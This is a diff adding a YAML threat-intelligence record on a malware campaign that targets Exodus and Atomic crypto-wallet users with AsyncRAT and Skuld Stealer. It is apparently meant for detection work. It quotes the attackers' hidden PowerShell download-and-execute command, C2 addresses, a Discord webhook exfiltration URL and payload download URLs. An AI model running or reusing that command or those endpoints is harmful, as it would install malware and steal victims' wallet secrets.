@@ -1,0 +1,72 @@
+description: This report details a multi-stage malware campaign utilizing social engineering,
+  PowerShell downloaders, and customized variants of AsyncRAT and Skuld Stealer. The
+  attackers target cryptocurrency users, specifically those using Exodus and Atomic
+  wallets, to steal sensitive data like seed phrases and passwords.
+attribution: Unknown (likely financially motivated threat actors)
+malware_families:
+- AsyncRAT
+- Skuld Stealer
+authors:
+- Check Point Research
+TTPs:
+  processes:
+  - chrome.exe
+  - msedge.exe
+  - brave.exe
+  - wscript.exe
+  - powershell.exe
+  - cks.exe
+  - installer.exe
+  - AClient.exe
+  commandline:
+  - powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString(\"https://pastebin.com/raw/ftknPNF7\")
+  - wscript.exe //updatelog
+  - cks.exe
+  - AClient.exe
+  powershell:
+  - IEX (New-Object Net.WebClient).DownloadString(\"https://pastebin.com/raw/ftknPNF7\")
+  registry_keys:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - executable: chrome.exe
+    destination_address: 101.99.76.120
+    port: 7707
+  - executable: chrome.exe
+    destination_address: 0.0.0.0
+    port: 7707
+  - executable: chrome.exe
+    destination_address: 87.120.127.37
+    port: 7707
+  - executable: chrome.exe
+    destination_address: 185.234.247.8
+    port: 7707
+  - executable: chrome.exe
+    destination_address: microads[.]top
+    port: 7707
+  file_activity:
+  - '%LOCALAPPDATA%\\Programs\\atomic\\LICENSE.electron.txt'
+  - '%LOCALAPPDATA%\\exodus\\app-<version>\\LICENSE'
+  - C:\\Windows\\Temp\\skul.exe
+  - C:\\Windows\\Temp\\AClient.exe
+  - exported_cookies.zip
+  persistence:
+  - Scheduled Task: Creates a scheduled task to periodically re-download and execute
+      AsyncRAT.
+  pipes: []
+  process_relations: []
+IOCs:
+- hash: 8135f126764592be3df17200f49140bfb546ec1b2c34a153aa509465406cb46c
+- hash: 160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693
+- domain: microads[.]top
+- url: https://discord.com/api/webhooks/1348629600560742462/RIgSAE7CYY-1eKMKk1SEif
+- mutex: 3575651c-bb47-448e-a514-22865732bbc
+- url: https://bitbucket[.]org/syscontrol6/syscontrol/downloads/cks.exe
+- hash: db1aa52842247fc3e726b339f7f4911491836b0931c322d1d2ab218ac5a4fb08
+- hash: f08676eeb489087bc0e47bd08a3f7c4b57ef5941698bc09d30857c650763859c
+- url: https://github.com/hackirby/wallets-injection/raw/main/atomic.asar
+- url: https://github.com/hackirby/wallets-injection/raw/main/exodus.asar
+reference: https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
+date_of_publication: June 12, 2025
+file_creation_date: June 12, 2025
